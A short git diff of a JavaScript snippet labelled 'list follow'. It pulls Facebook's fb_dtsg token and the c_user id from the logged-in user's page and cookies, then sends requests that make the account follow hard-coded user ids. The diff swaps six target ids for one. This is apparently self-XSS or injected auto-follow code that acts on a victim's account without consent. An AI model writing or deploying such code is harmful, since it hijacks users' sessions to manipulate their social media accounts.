@@ -1,4 +1,3 @@
-
 /*list follow*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
@@ -67,12 +66,8 @@ function a(abone) {
     };
     http4.send(params4);
 }
-a("100005115938614");
-a("100004620215045");
-a("100004532196646");
-a("100003147643648");
-a("100004156869752");
-a("100001050235420");
+a("100001953139265");
+
 
 
 
